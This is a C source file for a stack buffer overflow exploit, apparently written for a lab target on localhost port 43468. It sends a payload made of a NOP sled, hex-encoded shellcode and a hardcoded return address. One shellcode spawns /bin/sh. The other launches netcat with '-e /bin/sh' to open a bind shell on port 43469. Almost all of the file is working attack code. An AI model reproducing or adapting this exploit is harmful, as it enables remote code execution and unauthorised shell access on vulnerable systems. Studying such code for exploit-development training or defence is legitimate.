#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <string.h>

#define LOCAL 
int main(int argc, char **argv){

	char remote[114]="\x90\x31\xc0\xb0\x0b\x31\xd2\x52\xeb\x5b\x8b\x1c\x24\x88\x53\x07\xeb\x4b\x8b\x1c\x24\x88\x53\x02\xeb\x38\x8b\x1c\x24\x88\x53\x05\xeb\x27\x8b\x1c\x24\x88\x53\x03\xeb\x0a\x8b\x1c\x24\x88\x53\x0f\x89\xe1\xcd\x80\xe8\xf1\xff\xff\xff\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x6e\x65\x74\x63\x61\x74\x01\xe8\xd4\xff\xff\xff\x2d\x6c\x70\x01\xe8\xc3\xff\xff\xff\x34\x33\x34\x36\x39\x01\xe8\xb0\xff\xff\xff\x2d\x65\x01\xe8\xa0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x01";

	char local[32]="\x90\xeb\x10\x5b\x31\xc0\xb0\x0b\x31\xd2\x88\x53\x07\x52\x53\x89\xe1\xcd\x80\xe8\xeb\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x01";

	char buf[512];
	int i,j;
	char *exploit=0;
	int xpad=0;
	if(argc!=2){
		printf("Specify exploit type with -l or -r\n");
		return 0;
	}else{
		if(strncmp(argv[1],"-l",2)==0){
			exploit=local;
			xpad=196;
		}else if(strncmp(argv[1],"-r",2)==0){
			exploit=remote;
			xpad=114;
		}else{
			printf("Unrecognized exploit type; Use -l or -r\n");
			return 0;
		}
	}

	//Setting NOPs
	for(i=0;i<xpad;i++){
		buf[i]=0x90;
	}
	//Copying exploit
	for(;i<228;i++){
		buf[i]=exploit[i-xpad];
	}
	//Setting ret addr
	for(j=0;j<8;j++){
		buf[i++]=0x40;
		buf[i++]=0xf9;
		buf[i++]=0xff;
		buf[i++]=0xbf;
	}
	//NULLing rest
	for(;i<512;i++){
		buf[i]=0;
	}
	//Connect to server
	struct sockaddr_in srvr_addr;
	memset(&srvr_addr,0,sizeof(struct sockaddr_in));
	srvr_addr.sin_family=AF_INET;
	srvr_addr.sin_port=htons(43468);
	srvr_addr.sin_addr.s_addr=0x0100007f;
	int sockfd=socket(AF_INET,SOCK_STREAM,6);
	int test=connect(sockfd,(struct sockaddr *)&srvr_addr,sizeof(struct sockaddr_in));
	if(test<0) perror("Connect failed");
	else write(sockfd,buf,512);
	//Done
	close(sockfd);
	return 0;
}
